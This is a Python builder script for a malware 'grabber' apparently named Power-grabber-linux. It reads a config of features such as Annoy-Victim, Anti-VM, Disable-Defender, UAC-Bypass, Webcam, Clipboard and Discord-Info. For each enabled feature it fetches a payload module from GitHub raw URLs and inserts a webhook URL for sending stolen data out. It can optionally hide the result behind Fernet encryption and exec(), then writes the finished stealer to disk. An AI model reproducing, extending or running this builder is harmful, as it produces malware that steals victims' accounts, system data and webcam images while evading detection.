import requests
from cryptography.fernet import Fernet
import base64

# Function to obfuscate code using Fernet encryption
def obfuscate_code(plain_code):
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    cipher_text = cipher_suite.encrypt(plain_code.encode())
    encoded_key = base64.urlsafe_b64encode(key).decode()
    return encoded_key, cipher_text.decode()

# Function to generate the execution code for obfuscated content
def generate_execution_code(encoded_key, obfuscated_code):
    return f"""
import base64
from cryptography.fernet import Fernet

encoded_key = '{encoded_key}'
obfuscated_code = '{obfuscated_code}'

key = base64.urlsafe_b64decode(encoded_key)
cipher_suite = Fernet(key)
decrypted_code = cipher_suite.decrypt(obfuscated_code.encode()).decode()

exec(decrypted_code)
"""

with open('config.txt', 'r') as file:
    config = file.read()

def get_enabled_features(config_content):
    enabled_features = []
    webhook_url = ""
    filename = ""
    terms = [
        'Annoy-Victim', 'Anti-VM', 'Browser-Info', 'Clipboard', 'Discord-Info',
        'Discord-Injection', 'Disable-Defender', 'File-Name', 'Games-Info', 'Kill-Defender',
        'Exact-location', 'Port-Creation', 'Roblox-Account', 'Screenshot', 'Self-destruction',
        'Self-Exclusion', 'System-Info', 'UAC-Bypass', 'Watch-Dog', 'Webcam',
        'Webhook', 'Filepumper-Value', 'Ping', 'Obfuscate'
    ]
    feature_values = {}
    for term in terms:
        try:
            value = config_content.split(f'{term}: ')[1].split('\n')[0].strip('"').lower()
            if term == 'Webhook':
                webhook_url = value
            elif term == 'File-Name':
                filename = value
            elif term == 'Ping' or term == 'Filepumper-Value':
                feature_values[term] = value
            elif value in ['true', '1', 'yes', 'on']:
                enabled_features.append(term)
        except:
            continue
    return enabled_features, feature_values, webhook_url, filename

features, values, webhook, filename = get_enabled_features(config)
combined_code = ""

# Add code from URLs based on enabled features
def add_code_from_url(feature, url):
    if feature in features:
        code = requests.get(url).text.strip()
        return code + "\n" if code else ""
    return ""

combined_code += add_code_from_url('Annoy-Victim', 'https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Annoy.py')
combined_code += add_code_from_url('Self-destruction', 'https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Self-destruct.py')
combined_code += add_code_from_url('Webcam', 'https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Webcam.py')
combined_code += add_code_from_url('Screenshot', 'https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Screenshot.py')
combined_code += add_code_from_url('Port-Creation', 'https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Port.py')
combined_code += add_code_from_url('Anti-VM', 'https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/vm-check.py')
combined_code += add_code_from_url('Exact-location', 'https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Location.py')
combined_code += add_code_from_url('Clipboard', 'https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Clipboard.py')
combined_code += add_code_from_url('System-Info', 'https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/System-Info.py')
combined_code += add_code_from_url('Discord-Info', 'https://raw.githubusercontent.com/Dispnser/Power-grabber-linux/refs/heads/main/Options/Discord-Info.py')

final_code = f"webhook_url = '{webhook}'\n" + combined_code

# Check if obfuscation is enabled and apply it
if 'Obfuscate' in features:
    encoded_key, obfuscated_code = obfuscate_code(final_code)
    execution_code = generate_execution_code(encoded_key, obfuscated_code)
else:
    execution_code = final_code

# Write the execution code to the file
with open(filename, 'w', encoding='utf-8') as grabber_file:
    grabber_file.write(execution_code)

print("Code has been processed and saved.")
